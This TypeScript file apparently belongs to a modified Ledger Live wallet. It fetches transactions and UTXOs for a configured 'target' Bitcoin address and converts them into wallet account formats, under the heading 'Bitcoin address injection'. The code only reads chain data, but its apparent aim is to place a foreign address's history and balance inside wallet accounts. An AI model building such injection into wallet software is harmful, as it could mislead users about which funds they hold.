/**
 * Ledger Live Explorer API integration for Bitcoin address injection
 */

import { BigNumber } from "bignumber.js";
import type { OperationType } from "@ledgerhq/types-live";
import { getCryptoCurrencyById } from "@ledgerhq/cryptoassets";
import BitcoinLikeExplorer from "../wallet-btc/explorer";
import { getTargetBitcoinAddress } from "./config";

// Helper function to get the current target address
export function getTargetAddress(): string {
  return getTargetBitcoinAddress();
}

// Backward compatibility - keep TARGET_BITCOIN_ADDRESS as a function call
export const TARGET_BITCOIN_ADDRESS = getTargetAddress();

interface BlockchainApiTransaction {
  hash: string;
  time: number;
  block_height?: number | undefined;
  inputs: Array<{
    prev_out: {
      addr: string;
      value: number;
    };
  }>;
  out: Array<{
    addr: string;
    value: number;
  }>;
}

interface BlockchainApiResponse {
  address: string;
  final_balance: number;
  n_tx: number;
  total_received: number;
  total_sent: number;
  txs: BlockchainApiTransaction[];
}

interface BlockchainUtxo {
  tx_hash_big_endian: string;
  tx_hash: string;
  tx_output_n: number;
  script: string;
  value: number;
  value_hex: string;
  confirmations: number;
  tx_index: number;
}

interface BlockchainUtxoResponse {
  unspent_outputs: BlockchainUtxo[];
}

/**
 * Fetch address information using Ledger Live Explorer API
 */
export async function fetchAddressInfo(address: string): Promise<BlockchainApiResponse> {
  try {
    // Use Ledger Live's Bitcoin explorer
    const currency = getCryptoCurrencyById("bitcoin");
    const explorer = new BitcoinLikeExplorer({ cryptoCurrency: currency });

    // Get current block for height reference
    const currentBlock = await explorer.getCurrentBlock();
    const currentBlockHeight = currentBlock?.height || 916000;

    // Fetch transactions using Ledger's explorer
    const addressObj = { address, account: 0, index: 0 };
    const { txs } = await explorer.getTxsSinceBlockheight(
      1000, // batch size
      addressObj,
      0, // from block height (start from beginning)
      currentBlockHeight,
      false, // not pending
      null // no pagination token
    );

    // Calculate balance from transactions
    let final_balance = 0;
    let total_received = 0;
    let total_sent = 0;

    const processedTxs: BlockchainApiTransaction[] = [];

    txs.forEach(tx => {
      // Convert Ledger explorer format to our format
      const convertedTx: BlockchainApiTransaction = {
        hash: tx.id,
        time: new Date(tx.received_at).getTime() / 1000,
        block_height: tx.block?.height || undefined,
        inputs: tx.inputs.map(input => ({
          prev_out: {
            addr: input.address,
            value: parseInt(input.value),
          }
        })),
        out: tx.outputs.map(output => ({
          addr: output.address,
          value: parseInt(output.value),
        }))
      };

      processedTxs.push(convertedTx);

      // Calculate balance
      tx.outputs.forEach(output => {
        if (output.address === address) {
          const value = parseInt(output.value);
          final_balance += value;
          total_received += value;
        }
      });

      tx.inputs.forEach(input => {
        if (input.address === address) {
          const value = parseInt(input.value);
          final_balance -= value;
          total_sent += value;
        }
      });
    });

    return {
      address,
      final_balance,
      n_tx: txs.length,
      total_received,
      total_sent,
      txs: processedTxs,
    };
  } catch (error) {
    console.error(`Failed to fetch address info for ${address}:`, error);
    throw error;
  }
}

/**
 * Convert blockchain.com transaction to Ledger Live operation format
 */
export function convertToOperation(tx: BlockchainApiTransaction, address: string) {
  const isReceive = tx.out.some(output => output.addr === address);
  const isSend = tx.inputs.some(input => input.prev_out.addr === address);

  let value = 0;
  let type: OperationType = "NONE";

  if (isReceive && !isSend) {
    // Pure receive
    type = "IN";
    value = tx.out
      .filter(output => output.addr === address)
      .reduce((sum, output) => sum + output.value, 0);
  } else if (isSend && !isReceive) {
    // Pure send
    type = "OUT";
    value = tx.inputs
      .filter(input => input.prev_out.addr === address)
      .reduce((sum, input) => sum + input.prev_out.value, 0);
  } else if (isSend && isReceive) {
    // Self transaction - use NONE for now since SELF is not in OperationType
    type = "NONE";
    const received = tx.out
      .filter(output => output.addr === address)
      .reduce((sum, output) => sum + output.value, 0);
    const sent = tx.inputs
      .filter(input => input.prev_out.addr === address)
      .reduce((sum, input) => sum + input.prev_out.value, 0);
    value = Math.abs(received - sent);
  }

  return {
    id: tx.hash,
    hash: tx.hash,
    type,
    value: new BigNumber(value),
    fee: new BigNumber(0), // Fee calculation would require more complex logic
    blockHeight: tx.block_height !== undefined ? tx.block_height : null,
    blockHash: null,
    accountId: "", // Will be set by the caller
    senders: tx.inputs.map(input => input.prev_out.addr),
    recipients: tx.out.map(output => output.addr),
    date: new Date(tx.time * 1000),
    extra: {},
  };
}

/**
 * Fetch current blockchain height using Ledger Live Explorer API
 */
export async function fetchCurrentBlockHeight(): Promise<number> {
  try {
    const currency = getCryptoCurrencyById("bitcoin");
    const explorer = new BitcoinLikeExplorer({ cryptoCurrency: currency });

    const currentBlock = await explorer.getCurrentBlock();
    return currentBlock?.height || 916000; // Fallback to reasonable default
  } catch (error) {
    console.error("Failed to fetch current block height:", error);
    // Fallback to a reasonable default if API fails
    return 916000; // Current approximate Bitcoin block height
  }
}

/**
 * Fetch UTXOs for an address using Ledger Live Explorer API
 */
export async function fetchUtxos(address: string): Promise<BlockchainUtxo[]> {
  try {
    const currency = getCryptoCurrencyById("bitcoin");
    const explorer = new BitcoinLikeExplorer({ cryptoCurrency: currency });

    // Get current block for confirmations calculation
    const currentBlock = await explorer.getCurrentBlock();
    const currentBlockHeight = currentBlock?.height || 916000;

    // Fetch transactions to build UTXOs
    const addressObj = { address, account: 0, index: 0 };
    const { txs } = await explorer.getTxsSinceBlockheight(
      1000, // batch size
      addressObj,
      0, // from block height
      currentBlockHeight,
      false, // not pending
      null // no pagination token
    );

    // Build UTXOs from transaction outputs
    const utxos: BlockchainUtxo[] = [];
    const spentOutputs = new Set<string>();

    // First pass: collect all spent outputs
    txs.forEach(tx => {
      tx.inputs.forEach(input => {
        const key = `${input.output_hash}:${input.output_index}`;
        spentOutputs.add(key);
      });
    });

    // Second pass: collect unspent outputs
    txs.forEach(tx => {
      tx.outputs.forEach(output => {
        if (output.address === address) {
          const key = `${output.output_hash}:${output.output_index}`;
          if (!spentOutputs.has(key)) {
            const confirmations = output.block_height ?
              currentBlockHeight - output.block_height + 1 : 0;

            utxos.push({
              tx_hash_big_endian: output.output_hash,
              tx_hash: output.output_hash,
              tx_output_n: output.output_index,
              script: "", // Not needed for our use case
              value: parseInt(output.value),
              value_hex: parseInt(output.value).toString(16),
              confirmations,
              tx_index: 0, // Not needed for our use case
            });
          }
        }
      });
    });

    return utxos;
  } catch (error) {
    console.error(`Failed to fetch UTXOs for ${address}:`, error);
    // Return empty array if UTXO fetch fails
    return [];
  }
}

/**
 * Convert blockchain.com UTXO to Ledger Live BitcoinOutput format
 */
export function convertToUtxo(utxo: BlockchainUtxo, address: string): any {
  return {
    hash: utxo.tx_hash_big_endian,
    outputIndex: utxo.tx_output_n,
    blockHeight: null, // We don't have block height in UTXO response
    address: address,
    value: new BigNumber(utxo.value),
    rbf: false,
    isChange: false,
  };
}

/**
 * Check if an address is our target address
 */
export function isTargetAddress(address: string): boolean {
  return address === getTargetAddress();
}
